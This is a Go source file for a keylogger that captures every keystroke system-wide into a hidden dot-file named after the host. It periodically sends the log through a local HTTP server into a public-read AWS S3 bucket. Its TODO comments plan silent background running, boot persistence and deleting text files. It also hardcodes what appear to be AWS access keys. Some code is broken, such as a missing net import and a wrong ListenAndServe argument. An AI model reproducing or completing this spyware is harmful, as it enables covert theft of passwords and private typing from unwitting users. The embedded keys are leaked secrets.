package main

import (
	"fmt"
	"os"
	"github.com/robotn/gohook"
	"time"
	"net/http"
	"bytes"
	"io"
	"mime/multipart"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/s3"
)

// TO IMPLEMENT:
// Delete all text files
// Not sure if .filename.txt actually hides the text file? I don't think it does
// Make it run silently in the bg
// Make it so it auto finds a port to ues instead of defaulting to 8080 as my pc was using 8080 alr lol!
// Find a way to implement boot on startup
// Upload to github


func main() {

	os.Setenv("AWS_ACCESS_KEY_ID", "AKIAWJXFFCWM7RE6XR7Q")
    os.Setenv("AWS_SECRET_ACCESS_KEY", "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")
    os.Setenv("AWS_REGION", "ap-southeast-2")

	go initServer()

	keylog()
}

// func fileExists(path string) bool {
//     _, err := os.Stat(path)
//     return !os.IsNotExist(err)
// }

func keylog() {

	// Start the listening process
	evChan := hook.Start()
	defer hook.End()

	var lastTime time.Time
	runTime := time.Now()

	hostName, err := os.Hostname()
	if err != nil {
		panic(err)
	}

	// need to test if the name actually changes.
	fileName := fmt.Sprintf(".%s - %s.txt", hostName, runTime.Format(time.ANSIC))
	fmt.Println(fileName)

	file, err := os.Create(fileName)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	for ev := range evChan {
		if ev.Kind == hook.KeyDown {
			// 27 == esc - temp
			if ev.Keychar == 27 {
				err = uploadFile(fileName)
				os.Remove(fileName)
				if err != nil {
					panic(err)
				}
				break
			}

			// To change - Idk if i should set this to 1 hr / 6 hrs ?
			if time.Since(runTime).Minutes() >= 1 {
				err = uploadFile(fileName)
				os.Remove(fileName)
				if err != nil {
					panic(err)
				}
				file.Close()
				fileName := fmt.Sprintf(".%s - %s.txt", hostName, runTime.Format(time.ANSIC))
				file, err = os.Create(fileName)
				if err != nil {
					panic(err)
				}
				runTime = time.Now()
			}

			// Calcs diff between time
			now := time.Now()
			var diff time.Duration
			if !lastTime.IsZero() {
				diff = now.Sub(lastTime)
			}
			lastTime = now

			// If diff > 5 print a new line for ease of reading
			if diff.Seconds() > 5 {
				file.WriteString("\n")
			}

			// Print to file any keystroke recorded and their keychar value
			file.WriteString(hook.RawcodetoKeychar(ev.Rawcode))

		}
	}
}

func uploadFile(fileName string) error {

	file, err := os.Open(fileName)
	if err != nil {
		panic(err)
	}

	defer file.Close()

	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)

	temp, err := writer.CreateFormFile("file", fileName)
	if err != nil {
		return err
	}

	// Copy file data to temp
	_, err = io.Copy(temp, file)
	if err != nil {
		return err
	}
	writer.Close()

	// HTTP POST request to localhost with the file
	req, err := http.NewRequest("POST", "http://localhost:8080/upload", &buf)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	// Send the request to server and await response
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()	

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("upload failed: %s", resp.Status)
	}

	return nil
}


func initServer() {

	portListener, err := net.Listen("tcp", ":0")
	if err != nil {
		panic(err)
	}

	// I don't think i need this line?
	http.HandleFunc("/upload", uploadHandler)
	panic(http.ListenAndServe(portListener, nil))
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {

	// Limit size of file
	r.ParseMultipartForm(10 << 20)

	file, dataHandler, err := r.FormFile("file")
	if err != nil {
		panic(err)
	}
	defer file.Close()

	// Create a temp file 
	fileMetaData := dataHandler.Filename
	newFile, err := os.Create(fileMetaData)
	if err != nil {
		panic(err)
	}
	defer newFile.Close()

	// Make a copy of the newFile so S3 can access the path and file to open to upload.
	io.Copy(newFile, file)

	// Pass through the file path
	err = uploadToS3(fileMetaData, dataHandler.Filename)
	if err != nil {
		panic(err)
	}
}

func uploadToS3(localPath, s3Key string) error {
	sess := session.Must(session.NewSession(&aws.Config{
		Region: aws.String("ap-southeast-2"),
	}))

	file, err := os.Open(localPath)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	s3client := s3.New(sess)

	_, err = s3client.PutObject(&s3.PutObjectInput{
		Bucket: aws.String("vialathor-keylog"),
		Key:    aws.String(s3Key),
		Body:   file,
		ACL:    aws.String("public-read"),
	})
	return err
}